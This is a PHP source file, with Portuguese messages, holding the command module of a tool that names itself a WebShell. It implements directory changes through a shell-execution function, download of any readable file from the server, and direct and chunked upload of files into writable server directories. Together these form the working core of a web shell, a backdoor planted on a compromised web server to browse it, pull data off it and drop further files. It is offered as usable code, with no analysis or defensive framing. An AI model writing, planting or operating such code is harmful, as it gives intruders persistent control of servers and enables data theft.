<?php
class Commands{
    private static $errors = array(
        0 => 'There is no error, the file uploaded with success',
        1 => 'The uploaded file exceeds the upload_max_filesize directive in php.ini',
        2 => 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form',
        3 => 'The uploaded file was only partially uploaded',
        4 => 'No file was uploaded',
        6 => 'Missing a temporary folder',
        7 => 'Failed to write file to disk.',
        8 => 'A PHP extension stopped the file upload.',
    );
    public static function test($args){
        response::$body = "Testando 123!".PHP_EOL."args: ".$args.PHP_EOL."path: ".WebShell::$path.PHP_EOL;
        return true;
    }
    public static function cd($args){
        $escape = WebShell::$escapeargshell;
        $shell = WebShell::$shell;
        $args = $escape($args);

        if(strlen(($out = trim($shell("cd ".WebShell::$path." && cd".(($len = strlen($args)) > 0 ? ' '.$args : ''). ' 2>&1')))) > 5){
            response::$body = $out;
            return true;
        }
        
        if(!($path = WebShell::clear_path(($out = trim($shell('cd '.WebShell::$path.' && cd'.($len > 0 ? ' '.$args : '').' && '.(WebShell::$is_win ? "echo %cd%" : "pwd").' 2>&1')))))){
            response::$body = $out;
            
            return true;
        }
        WebShell::$path = $path;
        
        return true;
    }
    public static function download($args){
        if(strlen($args) < 1){
            response::$code = 400;
            response::$body = "Try 'download [server file] [local file]'";
            return true;
        }
        $path = WebShell::local_path($args);
        if(!$path || !is_file($path)){
            response::$code = 404;
            response::$body = "download: ".$args.": No such file or directory";
            return true;
        }
        if(!is_readable($path)){
            response::$code = 403;
            response::$body = "download: ".$args.": Permission denied";
            return true;
        }
        response::download($path);
    }
    public static function upload($args){
        
        if(!isset($_FILES['file'])){
            response::$code = 400;
            response::$body = "Nenhum arquivo foi enviado";
            return true;
        }
        if(strlen($args) < 1){
            $args = './';
        }
        $dirname = './';
        $filename = '';
        if(strpos($args, '/') !== false){
            $dirname = dirname($args).(endsWith($args, '/') ? '' : '/');
            $filename = basename($_FILES['file']['name']);
        }
        else{
            $filename = $args;
        }
        $args = WebShell::local_path($dirname);
        if(!$args || !is_dir($args)){
            response::$code = 404;
            response::$body = "upload: ".$dirname.": No such file or directory";
            return true;
        }
        $dirname = $args;
        if(!is_writable($dirname)){
            response::$code = 403;
            response::$body = "sh: 1: cannot create ".$dirname.$filename.": Permission denied";
            return true;
        }
        if(!is_uploaded_file($_FILES['file']['tmp_name'])){
            response::$code = 500;
            response::$body = "O arquivo não foi enviado com sucesso!";
            return true;
        }
        if($_FILES['file']['error'] != UPLOAD_ERR_OK){
            response::$code = 500;
            response::$body = self::$errors[$_FILES['file']['error']];
            return true;
        }
        if(!move_uploaded_file($_FILES['file']['tmp_name'], $dirname.$filename)){
            response::$code = 500;
            response::$body = "Falha ao mover o arquivo para ".$dirname.$filename;
            return true;
        }
        
        response::$body = "Arquivo salvo em ".$dirname.$filename;
        
        return true;
    }
    public static function startupload($args){
        if(UploadInBlocks::Uploading()){
            response::$code = 406;
            response::$body = 'Já existe um upload em progresso, use cancel-upload';
            return true;
        }
        $dirname = strpos($args, '/') !== false ? dirname($args) : './';
        $filename = basename($args);

        $dirname = WebShell::local_path($dirname);
        if(!$dirname || !is_dir($dirname)){
            response::$code = 404;
            response::$body = "startupload: ".(strpos($args, '/') !== false ? dirname($args) : './').": No such file or directory";
            return true;
        }
        
        if(!is_writable($dirname)){
            response::$code = 403;
            response::$body = "sh: 1: cannot create ".$dirname.$filename.": Permission denied";
            return true;
        }
        

        UploadInBlocks::Start($dirname.$filename);
        return true;
    }
    public static function uploadblock($args){
        if(!UploadInBlocks::Uploading()){
            response::$body = 'Não existe nenhum upload em progresso, inicie um com uploadinblocks';
            return true;
        }
        
        if(!UploadInBlocks::Upload($args)){
            if(UploadInBLocks::Error()){
                response::$code = 200;
                response::$body = UploadInBLocks::Error();
                UploadInBlocks::Cancel();
                return true;
            }
            
        }
        response::$code = 202;
        return true;
    }
    public static function stopupload($args){
        if(!UploadInBlocks::Uploading()){
            response::$body = 'Não existe nenhum upload em progresso, inicie um com uploadinblocks';
            return true;
        }
        $name = UploadInBlocks::FileName();
        if(!UploadInBlocks::Stop()){
            if(UploadInBLocks::Error()){
                response::$body = UploadInBLocks::Error();
                UploadInBlocks::Cancel();
                return true;
            }
        }
        response::$body = "Arquivo salvo em ".$name;
        return true;
    }
    public function cancelupload($args){
        if(!UploadInBlocks::Uploading()){
            response::$body = 'Não existe nenhum upload em progresso, inicie um com uploadinblocks';
            return true;
        }
        UploadInBlocks::Cancel();
        response::$body = "Upload cancelado com sucesso!";
        return true;
    }
}
